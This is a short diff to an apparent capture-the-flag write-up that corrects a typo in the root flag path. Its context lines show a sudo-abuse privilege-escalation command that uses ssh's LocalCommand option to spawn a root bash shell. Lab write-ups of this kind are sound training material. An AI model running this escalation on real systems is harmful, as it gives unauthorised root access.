@@ -106,6 +106,6 @@ sudo /usr/bin/ssh -v -o PermitLocalCommand=yes -o 'LocalCommand=/bin/bash'
 josh@127.0.0.1
 ```
 
-Which gives us root access, the flag can then be found at `/root/rrot.txt`
+Which gives us root access, the flag can then be found at `/root/root.txt`
 
 
